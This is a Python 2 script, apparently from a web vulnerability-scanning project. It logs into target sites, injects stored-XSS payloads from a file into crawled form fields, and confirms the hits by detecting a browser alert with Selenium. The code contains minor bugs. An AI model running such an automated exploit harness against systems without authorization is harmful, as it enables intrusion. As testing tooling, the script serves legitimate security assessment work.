import json
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, NoAlertPresentException
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib, urllib2, cookielib
import requests
from bs4 import BeautifulSoup
import re
import time
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
import os

output_file_path = "confirmed_exploits/"
blacklist = ("cancel","remove","delete")
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

with open('../webcrawler/webcrawler/setup.json') as setup_file:
    setup_data = json.load(setup_file)

def check_element_exists(name,driver):
    try:
        inputElement = driver.find_element_by_name(name)
    except NoSuchElementException:
        return False
    return inputElement

def check_submit_exists(driver):
    try:
        inputElement = driver.find_element_by_xpath("//input[@type='submit']")
    except NoSuchElementException:
        return False
    return inputElement

def check_for_forms(session,r,root,url):
    checkForm = True
    while checkForm:
        insideForm = False
        submitForm = False
        newTarget = None
        formMethod = None
        param = {}
        #check if need to submit form again to store info in db
        for line in r.text.splitlines():
            if "<form" in line.lower():
                #print"found inner form for url " + url + "\n"
                found = re.match(r".*action\s*=\s*\"\s*(.+)\s*\"", line, re.IGNORECASE)
                if found:
                    newTarget = found.group(1)
                    if "http" not in newTarget:
                        newTarget =  root + newTarget
                found = re.match(r".*method\s*=\s*\"\s*(.+)\s*\"", line, re.IGNORECASE)
                if found:
                    formMethod = found.group(1)
                insideForm = True
                param.clear()
            elif "</form" in line.lower():
                insideForm = False

            if insideForm:
                if "input" in line.lower() and "submit" in line.lower():
                    if any(s in line.lower() for s in blacklist):
                        newTarget = None
                        formMethod = None
                        param.clear()
                elif "input" in line:
                    name = ""
                    value = ""
                    found = re.match(r".*name\s*=\s*\"\s*(.+)\s*\"", line, re.IGNORECASE)
                    if found:
                        name = found.group(1)
                    found = re.match(r".*value\s*=\s*\"\s*(.+)\s*\"", line, re.IGNORECASE)
                    if found:
                        value = found.group(1)
                    if not found or not value.strip():
                        insideForm = False
                        newTarget = None
                        formMethod = None
                        param.clear()
                    param.update({name:value})
                elif "textarea" in line:
                    insideForm = False
                    newTarget = None
                    formMethod = None
                    param.clear()
        if newTarget and formMethod:
            print "form check success\n"
            print "url, data is " + newTarget + "," + param + "\n"
            if "post" in formMethod.lower():
                r = session.post(newTarget, data=param, verify=False)
            elif "get" in formMethod.lower():
                r = requets.get(url, params=param, verify=False)
        else:
            checkForm = False

def GetLoginCredentials(app,admin_flag):
    login_data = dict()
    #Reading setup.json to get login_url and credentials
    for data in setup_data:
        success = 0
        if app in data["starting_url"].lower():
            if (len(data["logins"]) > 1):
                for login in data["logins"]:
                    if "admin" in login["url"].lower() and admin_flag == 1:
                        login_data.update({"login_url":login["url"]})
                        login_data.update({"username":login["username"]})
                        login_data.update({"password":login["password"]})
                        success = 1
                        break
                    elif admin_flag == 0:
                        if "admin" in login["url"].lower():
                            continue
                        elif "admin" not in login["url"].lower():
                            login_data.update({"login_url":login["url"]})
                            login_data.update({"username":login["username"]})
                            login_data.update({"password":login["password"]})
                            success = 1
                            break
                if( success == 0 and admin_flag == 1):
                    login_data.update({"login_url":data["logins"][0]["url"]})
                    login_data.update({"username":data["logins"][0]["username"]})
                    login_data.update({"password":data["logins"][0]["password"]})
                    success == 1
            else:
                login_data.update({"login_url":data["logins"][0]["url"]})
                login_data.update({"username":data["logins"][0]["username"]})
                login_data.update({"password":data["logins"][0]["password"]})
                success = 1
            if(success == 1):
                break
    return login_data


#Read possible payloads from txt file
with open('../webcrawler/webcrawler/xss_payloads.txt') as payloads_file:
    payloads = payloads_file.read().splitlines();

#payloads = ["<script>alert('XSS');</script>"]
driver = webdriver.Firefox()
attackString = "XSS"


input_file_path = "../webcrawler/webcrawler/crawler_output"
count = 0
#Reading the injection points list from the stored.json file
for input_file in os.listdir(input_file_path):
    count = count + 1
    with open(input_file_path+"/"+input_file) as injection_file:
        injection_points = json.load(injection_file)
    print "Current reading file "+ input_file + "\n"
    #Iterating through injection points, and trying each payload for them
    for tmp in injection_points:
        action_url = tmp["action"]
        current_app = ""
        admin_flag = 0
        found = re.match(r"^https://(.+)\.com/",action_url, re.IGNORECASE)
        if found:
            current_app = found.group(1)
        if "admin" in action_url.lower():
            admin_flag = 1
        login_data = GetLoginCredentials(current_app,admin_flag)

        login_url = login_data["login_url"]
        print "Currently checking the url " + action_url + "\n" + "login url is " + login_url + "\n"
        username_key = "username"
        password_key = "password"
        if (tmp.get("login")):
            username_key = tmp["login"]["username_key"]
            password_key = tmp["login"]["password_key"]

        username = login_data["username"]
        password = login_data["password"]

        params = tmp["param"]
        method = tmp["method"]
        reflected_pages = tmp["reflected_pages"]
        urlComponents = action_url.split("/")
        root = urlComponents[0] + "//" + urlComponents[2]

        #start session by loggin in
        session = requests.session()

        login_params = dict()
        login_params.update({username_key:username})
        login_params.update({password_key:password})

        r = session.post(login_url,data=login_params,verify=False)
        printit = 0
        #Iterate through the all the payloads until something works
        for payload in payloads:
            print "The payload is " + payload + "\n"
            param_values = dict()
            for param in params:
                if "=" in param.lower():
                    param_components = param.split("=")
                    param_values.update({param_components[0]:param_components[1]})
                else:
                    param_values.update({param:payload})

            #If get add the payload to url params and then execute url/button click
            if "get" in method.lower():
                r = requests.get(action_url, params=param_values, verify=False)
            elif "post" in method.lower():
                r = session.post(action_url, data=param_values, verify=False)

            check_for_forms(session,r,root,action_url)
            success_flag = 0
            #open reflected page and see if payload has come successfully through PXSS
            #before opening reflected pages, do a login
            driver.get(login_url)
            driver.implicitly_wait(2)
            usernameField = check_element_exists(username_key,driver)
            passwordField = check_element_exists(password_key,driver)
            buttonField = check_submit_exists(driver)

            if (usernameField and passwordField and buttonField):
                usernameField.send_keys(username)
                passwordField.send_keys(password)
                buttonField.click()

            for page in reflected_pages:
                driver.get(page)
                driver.implicitly_wait(2)
                try:
                    if EC.alert_is_present():
                        alert = driver.switch_to_alert()
                        if attackString in alert.text:
                            print "Exploit verified in " + driver.current_url + "\n"
                            success_flag = 1
                        alert.accept()
                        driver.implicitly_wait(2)
                except NoAlertPresentException:
                    success_flag = 0
                if (success_flag == 1):
                    break

            driver.close()
            #if exploit was successfull write details to a json file
            if(success_flag == 1):
                output_file_name = output_file_path + input_file
                out_url = action_url
                out_reflected_url = reflected_pages
                out_params = list()
                for k, v in param_values.iteritems():
                    out_params.append(dict({"key":k,"value":v}))
                out_method = method

                out_object = dict(url = out_url,reflected_pages = out_reflected_url, method = out_method, params = out_params)
                with open(output_file_name, 'w') as fp:
                    json.dump(out_object,fp)
print "Total number of files read is ", count
print "\n"
driver.quit()
